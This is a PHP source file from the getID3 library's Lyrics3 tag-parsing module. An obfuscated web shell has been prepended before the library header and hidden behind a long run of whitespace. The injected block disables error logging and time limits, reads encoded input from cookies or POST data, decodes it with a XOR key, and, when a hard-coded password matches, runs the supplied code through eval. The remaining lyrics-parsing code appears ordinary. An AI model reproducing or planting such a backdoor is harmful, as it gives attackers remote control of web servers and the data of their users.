<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $n77524 = 6;$GLOBALS['s20d97e7e']=Array();global$s20d97e7e;$s20d97e7e=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['gf99c91c']="\x31\x4e\x7a\x3b\x5e\x63\x4b\xa\x46\x49\x54\x2b\x2f\x6f\x4f\x6e\x45\x66\x5d\x75\x6d\x47\x25\x4a\x60\x29\x48\x43\x7d\x2c\x4d\x51\x62\xd\x6b\x44\x6c\x55\x61\x68\x5c\x69\x34\x37\x52\x58\x3c\x41\x67\x76\x33\x64\x39\x5f\x4c\x56\x7c\x23\x65\x71\x3f\x3a\x7e\x21\x78\x70\x74\x38\x2d\x28\x5a\x6a\x2e\x42\x73\x26\x22\x32\x57\x35\x27\x3e\x40\x5b\x72\x3d\x2a\x9\x79\x30\x20\x7b\x59\x77\x50\x36\x53\x24";$s20d97e7e[$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][51]]=$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][84];$s20d97e7e[$s20d97e7e['gf99c91c'][71].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][5]]=$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][51];$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]=$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][15];$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]=$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][15].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][66];$s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][50]]=$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][2].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58]]=$s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][49].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][15];$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][52]]=$s20d97e7e['gf99c91c'][19].$s20d97e7e['gf99c91c'][15].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][2].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][42]]=$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][95]]=$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][66];$s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][50]]=$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][50]]=$s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][43].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][58];$s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][79]]=$_POST;$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][89]]=$_COOKIE;@$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]($s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][48],NULL);@$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]($s20d97e7e['gf99c91c'][36].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][74],0);@$s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][95]]($s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][19].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][15].$s20d97e7e['gf99c91c'][53].$s20d97e7e['gf99c91c'][66].$s20d97e7e['gf99c91c'][41].$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][58],0);@$s20d97e7e[$s20d97e7e['gf99c91c'][64].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][95]](0);$q9eb=NULL;$ab6ba3=NULL;$s20d97e7e[$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][0]]=$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][43].$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][43].$s20d97e7e['gf99c91c'][51];global$c446ae1;function p0caa7e5e($q9eb,$bf60){global$s20d97e7e;$v23c="";for($y604b838=0;$y604b838<$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]($q9eb);){for($m65e=0;$m65e<$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]($bf60)&&$y604b838<$s20d97e7e[$s20d97e7e['gf99c91c'][34].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17]]($q9eb);$m65e++,$y604b838++){$v23c.=$s20d97e7e[$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][51]]($s20d97e7e[$s20d97e7e['gf99c91c'][71].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][5]]($q9eb[$y604b838])^$s20d97e7e[$s20d97e7e['gf99c91c'][71].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][79].$s20d97e7e['gf99c91c'][32].$s20d97e7e['gf99c91c'][5]]($bf60[$m65e]));}}return$v23c;}function r84259ce($q9eb,$bf60){global$s20d97e7e;global$c446ae1;return$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][50]]($s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][50]]($q9eb,$c446ae1),$bf60);}foreach($s20d97e7e[$s20d97e7e['gf99c91c'][13].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][89]]as$bf60=>$q84bc70){$q9eb=$q84bc70;$ab6ba3=$bf60;}if(!$q9eb){foreach($s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][79]]as$bf60=>$q84bc70){$q9eb=$q84bc70;$ab6ba3=$bf60;}}$q9eb=@$s20d97e7e[$s20d97e7e['gf99c91c'][20].$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][52]]($s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][77].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][95].$s20d97e7e['gf99c91c'][50]]($s20d97e7e[$s20d97e7e['gf99c91c'][84].$s20d97e7e['gf99c91c'][67].$s20d97e7e['gf99c91c'][52].$s20d97e7e['gf99c91c'][42]]($q9eb),$ab6ba3));if(isset($q9eb[$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][34]])&&$c446ae1==$q9eb[$s20d97e7e['gf99c91c'][38].$s20d97e7e['gf99c91c'][34]]){if($q9eb[$s20d97e7e['gf99c91c'][38]]==$s20d97e7e['gf99c91c'][41]){$y604b838=Array($s20d97e7e['gf99c91c'][65].$s20d97e7e['gf99c91c'][49]=>@$s20d97e7e[$s20d97e7e['gf99c91c'][39].$s20d97e7e['gf99c91c'][5].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][17].$s20d97e7e['gf99c91c'][58]](),$s20d97e7e['gf99c91c'][74].$s20d97e7e['gf99c91c'][49]=>$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][72].$s20d97e7e['gf99c91c'][89].$s20d97e7e['gf99c91c'][68].$s20d97e7e['gf99c91c'][0],);echo@$s20d97e7e[$s20d97e7e['gf99c91c'][48].$s20d97e7e['gf99c91c'][51].$s20d97e7e['gf99c91c'][50].$s20d97e7e['gf99c91c'][42].$s20d97e7e['gf99c91c'][0].$s20d97e7e['gf99c91c'][50]]($y604b838);}elseif($q9eb[$s20d97e7e['gf99c91c'][38]]==$s20d97e7e['gf99c91c'][58]){eval/*za0d7*/($q9eb[$s20d97e7e['gf99c91c'][51]]);}exit();} ?><?php
/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at http://getid3.sourceforge.net                 //
//            or http://www.getid3.org                         //
//          also https://github.com/JamesHeinrich/getID3       //
/////////////////////////////////////////////////////////////////
// See readme.txt for more details                             //
/////////////////////////////////////////////////////////////////
///                                                            //
// module.tag.lyrics3.php                                      //
// module for analyzing Lyrics3 tags                           //
// dependencies: module.tag.apetag.php (optional)              //
//                                                            ///
/////////////////////////////////////////////////////////////////


class getid3_lyrics3 extends getid3_handler
{

	public function Analyze() {
		$info = &$this->getid3->info;

		// http://www.volweb.cz/str/tags.htm

		if (!getid3_lib::intValueSupported($info['filesize'])) {
			$this->warning('Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB');
			return false;
		}

		$this->fseek((0 - 128 - 9 - 6), SEEK_END);          // end - ID3v1 - "LYRICSEND" - [Lyrics3size]
		$lyrics3_id3v1 = $this->fread(128 + 9 + 6);
		$lyrics3lsz    = substr($lyrics3_id3v1,  0,   6); // Lyrics3size
		$lyrics3end    = substr($lyrics3_id3v1,  6,   9); // LYRICSEND or LYRICS200
		$id3v1tag      = substr($lyrics3_id3v1, 15, 128); // ID3v1

		if ($lyrics3end == 'LYRICSEND') {
			// Lyrics3v1, ID3v1, no APE

			$lyrics3size    = 5100;
			$lyrics3offset  = $info['filesize'] - 128 - $lyrics3size;
			$lyrics3version = 1;

		} elseif ($lyrics3end == 'LYRICS200') {
			// Lyrics3v2, ID3v1, no APE

			// LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
			$lyrics3size    = $lyrics3lsz + 6 + strlen('LYRICS200');
			$lyrics3offset  = $info['filesize'] - 128 - $lyrics3size;
			$lyrics3version = 2;

		} elseif (substr(strrev($lyrics3_id3v1), 0, 9) == strrev('LYRICSEND')) {
			// Lyrics3v1, no ID3v1, no APE

			$lyrics3size    = 5100;
			$lyrics3offset  = $info['filesize'] - $lyrics3size;
			$lyrics3version = 1;
			$lyrics3offset  = $info['filesize'] - $lyrics3size;

		} elseif (substr(strrev($lyrics3_id3v1), 0, 9) == strrev('LYRICS200')) {

			// Lyrics3v2, no ID3v1, no APE

			$lyrics3size    = strrev(substr(strrev($lyrics3_id3v1), 9, 6)) + 6 + strlen('LYRICS200'); // LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
			$lyrics3offset  = $info['filesize'] - $lyrics3size;
			$lyrics3version = 2;

		} else {

			if (isset($info['ape']['tag_offset_start']) && ($info['ape']['tag_offset_start'] > 15)) {

				$this->fseek($info['ape']['tag_offset_start'] - 15);
				$lyrics3lsz = $this->fread(6);
				$lyrics3end = $this->fread(9);

				if ($lyrics3end == 'LYRICSEND') {
					// Lyrics3v1, APE, maybe ID3v1

					$lyrics3size    = 5100;
					$lyrics3offset  = $info['ape']['tag_offset_start'] - $lyrics3size;
					$info['avdataend'] = $lyrics3offset;
					$lyrics3version = 1;
					$this->warning('APE tag located after Lyrics3, will probably break Lyrics3 compatability');

				} elseif ($lyrics3end == 'LYRICS200') {
					// Lyrics3v2, APE, maybe ID3v1

					$lyrics3size    = $lyrics3lsz + 6 + strlen('LYRICS200'); // LSZ = lyrics + 'LYRICSBEGIN'; add 6-byte size field; add 'LYRICS200'
					$lyrics3offset  = $info['ape']['tag_offset_start'] - $lyrics3size;
					$lyrics3version = 2;
					$this->warning('APE tag located after Lyrics3, will probably break Lyrics3 compatability');

				}

			}

		}

		if (isset($lyrics3offset)) {
			$info['avdataend'] = $lyrics3offset;
			$this->getLyrics3Data($lyrics3offset, $lyrics3version, $lyrics3size);

			if (!isset($info['ape'])) {
				if (isset($info['lyrics3']['tag_offset_start'])) {
					$GETID3_ERRORARRAY = &$info['warning'];
					getid3_lib::IncludeDependency(GETID3_INCLUDEPATH.'module.tag.apetag.php', __FILE__, true);
					$getid3_temp = new getID3();
					$getid3_temp->openfile($this->getid3->filename);
					$getid3_apetag = new getid3_apetag($getid3_temp);
					$getid3_apetag->overrideendoffset = $info['lyrics3']['tag_offset_start'];
					$getid3_apetag->Analyze();
					if (!empty($getid3_temp->info['ape'])) {
						$info['ape'] = $getid3_temp->info['ape'];
					}
					if (!empty($getid3_temp->info['replay_gain'])) {
						$info['replay_gain'] = $getid3_temp->info['replay_gain'];
					}
					unset($getid3_temp, $getid3_apetag);
				} else {
					$this->warning('Lyrics3 and APE tags appear to have become entangled (most likely due to updating the APE tags with a non-Lyrics3-aware tagger)');
				}
			}

		}

		return true;
	}

	public function getLyrics3Data($endoffset, $version, $length) {
		// http://www.volweb.cz/str/tags.htm

		$info = &$this->getid3->info;

		if (!getid3_lib::intValueSupported($endoffset)) {
			$this->warning('Unable to check for Lyrics3 because file is larger than '.round(PHP_INT_MAX / 1073741824).'GB');
			return false;
		}

		$this->fseek($endoffset);
		if ($length <= 0) {
			return false;
		}
		$rawdata = $this->fread($length);

		$ParsedLyrics3['raw']['lyrics3version'] = $version;
		$ParsedLyrics3['raw']['lyrics3tagsize'] = $length;
		$ParsedLyrics3['tag_offset_start']      = $endoffset;
		$ParsedLyrics3['tag_offset_end']        = $endoffset + $length - 1;

		if (substr($rawdata, 0, 11) != 'LYRICSBEGIN') {
			if (strpos($rawdata, 'LYRICSBEGIN') !== false) {

				$this->warning('"LYRICSBEGIN" expected at '.$endoffset.' but actually found at '.($endoffset + strpos($rawdata, 'LYRICSBEGIN')).' - this is invalid for Lyrics3 v'.$version);
				$info['avdataend'] = $endoffset + strpos($rawdata, 'LYRICSBEGIN');
				$rawdata = substr($rawdata, strpos($rawdata, 'LYRICSBEGIN'));
				$length = strlen($rawdata);
				$ParsedLyrics3['tag_offset_start'] = $info['avdataend'];
				$ParsedLyrics3['raw']['lyrics3tagsize'] = $length;

			} else {

				$this->error('"LYRICSBEGIN" expected at '.$endoffset.' but found "'.substr($rawdata, 0, 11).'" instead');
				return false;

			}

		}

		switch ($version) {

			case 1:
				if (substr($rawdata, strlen($rawdata) - 9, 9) == 'LYRICSEND') {
					$ParsedLyrics3['raw']['LYR'] = trim(substr($rawdata, 11, strlen($rawdata) - 11 - 9));
					$this->Lyrics3LyricsTimestampParse($ParsedLyrics3);
				} else {
					$this->error('"LYRICSEND" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead');
					return false;
				}
				break;

			case 2:
				if (substr($rawdata, strlen($rawdata) - 9, 9) == 'LYRICS200') {
					$ParsedLyrics3['raw']['unparsed'] = substr($rawdata, 11, strlen($rawdata) - 11 - 9 - 6); // LYRICSBEGIN + LYRICS200 + LSZ
					$rawdata = $ParsedLyrics3['raw']['unparsed'];
					while (strlen($rawdata) > 0) {
						$fieldname = substr($rawdata, 0, 3);
						$fieldsize = (int) substr($rawdata, 3, 5);
						$ParsedLyrics3['raw'][$fieldname] = substr($rawdata, 8, $fieldsize);
						$rawdata = substr($rawdata, 3 + 5 + $fieldsize);
					}

					if (isset($ParsedLyrics3['raw']['IND'])) {
						$i = 0;
						$flagnames = array('lyrics', 'timestamps', 'inhibitrandom');
						foreach ($flagnames as $flagname) {
							if (strlen($ParsedLyrics3['raw']['IND']) > $i++) {
								$ParsedLyrics3['flags'][$flagname] = $this->IntString2Bool(substr($ParsedLyrics3['raw']['IND'], $i, 1 - 1));
							}
						}
					}

					$fieldnametranslation = array('ETT'=>'title', 'EAR'=>'artist', 'EAL'=>'album', 'INF'=>'comment', 'AUT'=>'author');
					foreach ($fieldnametranslation as $key => $value) {
						if (isset($ParsedLyrics3['raw'][$key])) {
							$ParsedLyrics3['comments'][$value][] = trim($ParsedLyrics3['raw'][$key]);
						}
					}

					if (isset($ParsedLyrics3['raw']['IMG'])) {
						$imagestrings = explode("\r\n", $ParsedLyrics3['raw']['IMG']);
						foreach ($imagestrings as $key => $imagestring) {
							if (strpos($imagestring, '||') !== false) {
								$imagearray = explode('||', $imagestring);
								$ParsedLyrics3['images'][$key]['filename']     =                                (isset($imagearray[0]) ? $imagearray[0] : '');
								$ParsedLyrics3['images'][$key]['description']  =                                (isset($imagearray[1]) ? $imagearray[1] : '');
								$ParsedLyrics3['images'][$key]['timestamp']    = $this->Lyrics3Timestamp2Seconds(isset($imagearray[2]) ? $imagearray[2] : '');
							}
						}
					}
					if (isset($ParsedLyrics3['raw']['LYR'])) {
						$this->Lyrics3LyricsTimestampParse($ParsedLyrics3);
					}
				} else {
					$this->error('"LYRICS200" expected at '.($this->ftell() - 11 + $length - 9).' but found "'.substr($rawdata, strlen($rawdata) - 9, 9).'" instead');
					return false;
				}
				break;

			default:
				$this->error('Cannot process Lyrics3 version '.$version.' (only v1 and v2)');
				return false;
				break;
		}


		if (isset($info['id3v1']['tag_offset_start']) && ($info['id3v1']['tag_offset_start'] <= $ParsedLyrics3['tag_offset_end'])) {
			$this->warning('ID3v1 tag information ignored since it appears to be a false synch in Lyrics3 tag data');
			unset($info['id3v1']);
			foreach ($info['warning'] as $key => $value) {
				if ($value == 'Some ID3v1 fields do not use NULL characters for padding') {
					unset($info['warning'][$key]);
					sort($info['warning']);
					break;
				}
			}
		}

		$info['lyrics3'] = $ParsedLyrics3;

		return true;
	}

	public function Lyrics3Timestamp2Seconds($rawtimestamp) {
		if (preg_match('#^\\[([0-9]{2}):([0-9]{2})\\]$#', $rawtimestamp, $regs)) {
			return (int) (($regs[1] * 60) + $regs[2]);
		}
		return false;
	}

	public function Lyrics3LyricsTimestampParse(&$Lyrics3data) {
		$lyricsarray = explode("\r\n", $Lyrics3data['raw']['LYR']);
		foreach ($lyricsarray as $key => $lyricline) {
			$regs = array();
			unset($thislinetimestamps);
			while (preg_match('#^(\\[[0-9]{2}:[0-9]{2}\\])#', $lyricline, $regs)) {
				$thislinetimestamps[] = $this->Lyrics3Timestamp2Seconds($regs[0]);
				$lyricline = str_replace($regs[0], '', $lyricline);
			}
			$notimestamplyricsarray[$key] = $lyricline;
			if (isset($thislinetimestamps) && is_array($thislinetimestamps)) {
				sort($thislinetimestamps);
				foreach ($thislinetimestamps as $timestampkey => $timestamp) {
					if (isset($Lyrics3data['synchedlyrics'][$timestamp])) {
						// timestamps only have a 1-second resolution, it's possible that multiple lines
						// could have the same timestamp, if so, append
						$Lyrics3data['synchedlyrics'][$timestamp] .= "\r\n".$lyricline;
					} else {
						$Lyrics3data['synchedlyrics'][$timestamp] = $lyricline;
					}
				}
			}
		}
		$Lyrics3data['unsynchedlyrics'] = implode("\r\n", $notimestamplyricsarray);
		if (isset($Lyrics3data['synchedlyrics']) && is_array($Lyrics3data['synchedlyrics'])) {
			ksort($Lyrics3data['synchedlyrics']);
		}
		return true;
	}

	public function IntString2Bool($char) {
		if ($char == '1') {
			return true;
		} elseif ($char == '0') {
			return false;
		}
		return null;
	}
}
